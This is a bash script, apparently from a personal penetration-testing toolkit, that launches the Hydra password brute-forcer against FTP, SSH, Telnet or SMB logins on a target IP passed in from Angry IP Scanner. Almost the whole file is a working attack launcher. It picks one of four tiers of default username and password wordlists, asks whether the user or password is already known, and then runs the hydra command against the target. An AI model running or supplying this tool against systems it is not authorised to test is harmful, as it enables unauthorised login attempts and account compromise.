#!/bin/bash

# Angry IP information -----------------------------------------------------------
# | Angry Name                 | Execution String              | Run in Terminal | Directory |
# | -------------------------- | ----------------------------- | --------------- | --------- |
# | 21_FTP - HYDRA | THIS_FILE ${fetcher.ip} ${fetcher.comment} ftp | TRUE            |           |
# | 22_SSH - HYDRA | THIS_FILE ${fetcher.ip} ${fetcher.comment} ssh | TRUE            |           |
# | 23_TELNET - HYDRA | THIS_FILE ${fetcher.ip} ${fetcher.comment} telnet | TRUE            |           |
# | 139_SMB - HYDRA | THIS_FILE ${fetcher.ip} ${fetcher.comment} smb | TRUE            |           |

# Script information -----------------------------------------------------------
# | Script Name       : HYDRA_FTP.sh
# | Description       : Script for brute force hydra
# | Directory         : ~/CYBER_TOOLS/SCRIPTS/
# | Author            : Jordon Archer
# | Date              : August 24, 2023
# ------------------------------------------------------------------------------      :

# -----------------------------------------------------------------------------------------------------

# Define colour variables
HEADER1=$(tput setaf 5; tput bold)
HEADER2=$(tput setaf 4; tput bold)
HEADER3=$(tput setaf 2; tput bold)
IMPORTANT_INFO=$(tput setaf 1; tput bold)
EXPECTED_INPUT=$(tput setaf 3; tput setab 0; tput bold)
GENERAL_INFO=$(tput setaf 6)
SUCCESS=$(tput setaf 2)
WARNING=$(tput setaf 3)
ERROR=$(tput setaf 1)
SCRIPT_EXAMPLE=$(tput setaf 7; tput setab 2)
NC=$(tput sgr0) # No Colour

# -----------------------------------------------------------------------------------------------------

# Tool name https://manytools.org/hacker-tools/ascii-banner/ font banner3
echo -e "${HEADER1}"  # Set colour to green and make it bold
echo "##     ## ##    ## ########  ########     ###       ########  ######## ##     ##  #######  ######## ########    ######## ######## ########  ##     ## #### ##    ##    ###    ##       
##     ##  ##  ##  ##     ## ##     ##   ## ##      ##     ## ##       ###   ### ##     ##    ##    ##             ##    ##       ##     ## ###   ###  ##  ###   ##   ## ##   ##       
##     ##   ####   ##     ## ##     ##  ##   ##     ##     ## ##       #### #### ##     ##    ##    ##             ##    ##       ##     ## #### ####  ##  ####  ##  ##   ##  ##       
#########    ##    ##     ## ########  ##     ##    ########  ######   ## ### ## ##     ##    ##    ######         ##    ######   ########  ## ### ##  ##  ## ## ## ##     ## ##       
##     ##    ##    ##     ## ##   ##   #########    ##   ##   ##       ##     ## ##     ##    ##    ##             ##    ##       ##   ##   ##     ##  ##  ##  #### ######### ##       
##     ##    ##    ##     ## ##    ##  ##     ##    ##    ##  ##       ##     ## ##     ##    ##    ##             ##    ##       ##    ##  ##     ##  ##  ##   ### ##     ## ##       
##     ##    ##    ########  ##     ## ##     ##    ##     ## ######## ##     ##  #######     ##    ########       ##    ######## ##     ## ##     ## #### ##    ## ##     ## ######## "
echo -e "${NC}"  # Reset colour and bold

# -----------------------------------------------------------------------------------------------------

#description
echo -e "${HEADER2}Description${NC}"

echo -e "\nThis a quick loader for hydra ftp attack\n"

# -----------------------------------------------------------------------------------------------------

# Variable table
echo -e "${HEADER2}Preloaded variables${NC}"  # Set title colour to blue and make it bold

## Define the variable
ip=$1
service=$3
user_name_list_1="$HOME/WORDLISTS/usernames/http_default_users.txt"
user_name_list_2="$HOME/WORDLISTS/usernames/cirt_default_usernames.txt"
user_name_list_3="$HOME/WORDLISTS/usernames/multiple_sources_users.txt"
user_name_list_4="$HOME/WORDLISTS/usernames/xato_net_usernames.txt"

password_list_1="$HOME/WORDLISTS/passwords/http_default_passwords.txt"
password_list_2="$HOME/WORDLISTS/passwords/unix_passwords.txt"
password_list_3="$HOME/WORDLISTS/passwords/most_used_passwords.txt"
password_list_4="$HOME/WORDLISTS/passwords/xato_net_passwords.txt"

## Print the header
printf "\n%-20s | %-15s\n" "${HEADER3}Variable" "Value${NC}"
printf "%-38s\n" "--------------------------------------"

# #Print the variable and its value
printf "%-20s | %-15s\n" "${SCRIPT_EXAMPLE}\$ip${NC}" "$ip"
printf "%-20s | %-15s\n" "${SCRIPT_EXAMPLE}\$user_name_list_1${NC}" "$user_name_list_1"
printf "%-20s | %-15s\n" "${SCRIPT_EXAMPLE}\$user_name_list_2${NC}" "$user_name_list_2"
printf "%-20s | %-15s\n" "${SCRIPT_EXAMPLE}\$user_name_list_3${NC}" "$user_name_list_3"
printf "%-20s | %-15s\n" "${SCRIPT_EXAMPLE}\$user_name_list_4${NC}" "$user_name_list_4"
printf "%-20s | %-15s\n" "${SCRIPT_EXAMPLE}\$password_list_1${NC}" "$password_list_1"
printf "%-20s | %-15s\n" "${SCRIPT_EXAMPLE}\$password_list_2${NC}" "$password_list_2"
printf "%-20s | %-15s\n" "${SCRIPT_EXAMPLE}\$password_list_3${NC}" "$password_list_3"
printf "%-20s | %-15s\n" "${SCRIPT_EXAMPLE}\$password_list_4${NC}" "$password_list_4"

echo ""

# -----------------------------------------------------------------------------------------------------

# Example string
echo -e "${HEADER2}Example String${NC}"  # Set title colour to cyan and make it bold

echo -e "${SCRIPT_EXAMPLE}\nhydra -L \$user_name_list_1 -P \$password_list_1 $ip ftp -e ns -v -I${NC}\n"

# -----------------------------------------------------------------------------------------------------

# Tell the user we are running the script
echo -e "${HEADER2}Script${NC}"  # Set title colour to cyan and make it bold

# -----------------------------------------------------------------------------------------------------

comment=$2

mkdir ~/Documents/BOXES/$comment -p
cd ~/Documents/BOXES/$comment


# Ask the user for the level of attack
read -e -p "${EXPECTED_INPUT}Choose the level of attack (1/2/3/4): ${NC}" -i "1" attack_level

case $attack_level in
    1)
        user_name_list=$user_name_list_1
        password_list=$password_list_1
        verbose="-V"
        ;;
    2)
        user_name_list=$user_name_list_2
        password_list=$password_list_2
        verbose="-v"
        ;;
    3)
        user_name_list=$user_name_list_3
        password_list=$password_list_3
        verbose="-v"
        ;;
    4)
        user_name_list=$user_name_list_4
        password_list=$password_list_4
        verbose="-v"
        ;;
    *)
        echo "Invalid attack level. Defaulting to level 1."
        user_name_list=$user_name_list_1
        password_list=$password_list_1
        verbose="-V"
        ;;
esac

# Ask the user if they know the username
read -e -p "${EXPECTED_INPUT}Do you know the username? (y/n): ${NC}" -i "n" know_username

if [[ $know_username == "y" ]]; then
    read -e -p "${EXPECTED_INPUT}Enter the username: ${NC}" -i "" username
    username_section="-l $username"
else
    username_section="-L $user_name_list"
fi

# Ask the user if they know the password
read -e -p "${EXPECTED_INPUT}Do you know the password? (y/n): ${NC}" -i "n" know_password

if [[ $know_password == "y" ]]; then
    read -e -p "${EXPECTED_INPUT}Enter the password: ${NC}" -i "" password
    password_section="-p $password"
else
    password_section="-P $password_list"
fi

# Tell the user we are running the script
echo -e "${HEADER2}Script used${NC}"  # Set title colour to cyan and make it bold

echo -e "\n${SCRIPT_EXAMPLE}hydra $username_section $password_section $ip $service -e ns $verbose -I ${NC}\n"

# Hydra attack based on user input

hydra $username_section $password_section $ip $service -e ns $verbose -I
# ...